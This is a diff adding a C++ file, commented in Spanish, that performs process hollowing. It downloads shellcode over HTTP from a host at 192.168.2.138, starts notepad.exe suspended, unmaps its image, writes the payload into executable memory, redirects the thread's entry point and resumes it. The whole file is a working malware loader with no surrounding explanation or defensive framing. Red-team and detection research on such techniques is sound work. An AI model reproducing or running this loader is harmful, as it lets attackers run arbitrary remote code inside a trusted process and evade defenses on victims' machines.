@@ -1,0 +1,142 @@
+#include <stdio.h>
+#include <windows.h>
+#include <string.h>
+#include <winternl.h>
+#include <winhttp.h>
+#include <iostream>
+#include <vector>
+
+// Función para descargar un archivo binario (shellcode) desde un servidor
+std::vector<BYTE> DownloadShellcode(LPCWSTR serverName, LPCWSTR objectName) {
+    HINTERNET hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return {};
+
+    HINTERNET hConnect = WinHttpConnect(hSession, serverName, INTERNET_DEFAULT_HTTP_PORT, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", objectName, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return {};
+    }
+
+    std::vector<BYTE> buffer;
+    DWORD dwSize = 0, dwDownloaded = 0;
+    do {
+        WinHttpQueryDataAvailable(hRequest, &dwSize);
+        if (dwSize > 0) {
+            std::vector<BYTE> tempBuffer(dwSize);
+            WinHttpReadData(hRequest, tempBuffer.data(), dwSize, &dwDownloaded);
+            buffer.insert(buffer.end(), tempBuffer.begin(), tempBuffer.begin() + dwDownloaded);
+        }
+    } while (dwSize > 0);
+
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hConnect);
+    WinHttpCloseHandle(hSession);
+
+    return buffer;
+}
+
+int main(int argc, char* argv[]) {
+
+    // URL del servidor y del archivo test.bin que contiene el shellcode
+    std::wstring serverName = L"192.168.2.138";
+    std::wstring objectName = L"/test.bin";  // Ruta del shellcode en el servidor
+    
+    // Descargar shellcode desde el servidor
+    std::vector<BYTE> shellcode = DownloadShellcode(serverName.c_str(), objectName.c_str());
+
+    if (shellcode.empty()) {
+        std::cerr << "Error al descargar el shellcode.\n";
+        return 1;
+    }
+
+    LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
+    PROCESS_INFORMATION procInfo;
+
+    // Crear un proceso suspendido
+    printf("[+] Creating Notepad.exe as Suspended Process.\n");
+    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startupInfo, &procInfo);
+
+    // Obtener el contexto del hilo del proceso suspendido
+    printf("[+] Getting Current Context.\n");
+    LPCONTEXT threadContext = new CONTEXT();
+    threadContext->ContextFlags = CONTEXT_FULL;
+    if (!GetThreadContext(procInfo.hThread, threadContext)) {
+        printf("[-] Error getting context\n");
+        return 0;
+    }
+
+    // Obtener la dirección base del proceso suspendido
+    PVOID baseAddress;
+
+#ifdef _X86_ 
+    ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Ebx + 8), &baseAddress, sizeof(PVOID), NULL);
+#endif
+
+#ifdef _WIN64
+    ReadProcessMemory(procInfo.hProcess, (PVOID)(threadContext->Rdx + (sizeof(SIZE_T) * 2)), &baseAddress, sizeof(PVOID), NULL);
+#endif
+
+    // Obtener la dirección de NtUnmapViewOfSection y desmapear todas las secciones
+    printf("[+] Unmapping the Memory Section of Target Process.\n");
+    HMODULE ntdllHandle = GetModuleHandleA("ntdll");
+    FARPROC ntUnmapViewOfSectionProc = GetProcAddress(ntdllHandle, "NtUnmapViewOfSection");
+    _NtUnmapViewOfSectionFunc ntUnmapViewOfSection = (_NtUnmapViewOfSectionFunc)ntUnmapViewOfSectionProc;
+    if (ntUnmapViewOfSection(procInfo.hProcess, baseAddress)) {
+        printf("[-] Error to unmap the Section\n");
+        return 0;
+    }
+
+    // Asignar memoria en el proceso suspendido para el shellcode descargado
+    printf("[+] Allocating memory for shellcode.\n");
+    PVOID allocatedMemory = VirtualAllocEx(procInfo.hProcess, baseAddress, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!allocatedMemory) {
+        printf("[-] Error allocating memory in the target process.\n");
+        return 0;
+    }
+
+    // Escribir el shellcode descargado en la memoria asignada del proceso suspendido
+    printf("[+] Writing shellcode to the target process memory.\n");
+    if (!WriteProcessMemory(procInfo.hProcess, allocatedMemory, shellcode.data(), shellcode.size(), NULL)) {
+        printf("[-] Error writing shellcode to the process memory.\n");
+        return 0;
+    }
+
+    // Ajustar el punto de entrada al shellcode
+#ifdef _X86_
+    threadContext->Eax = (DWORD)allocatedMemory;
+#endif
+#ifdef _WIN64
+    threadContext->Rcx = (DWORD64)allocatedMemory;
+#endif
+
+    // Establecer el contexto del hilo del proceso con el nuevo punto de entrada
+    printf("[+] Setting the thread context to the shellcode entry point.\n");
+    if (!SetThreadContext(procInfo.hThread, threadContext)) {
+        printf("[-] Error setting the thread context.\n");
+        return 0;
+    }
+
+    // Reanudar el proceso suspendido para ejecutar el shellcode
+    printf("[+] Resuming the thread to execute the shellcode.\n");
+    if (!ResumeThread(procInfo.hThread)) {
+        printf("[-] Error resuming the thread.\n");
+        return 0;
+    }
+
+    printf("[+] Process Hollowing with remote shellcode injection completed.\n");
+    return 0;
+}
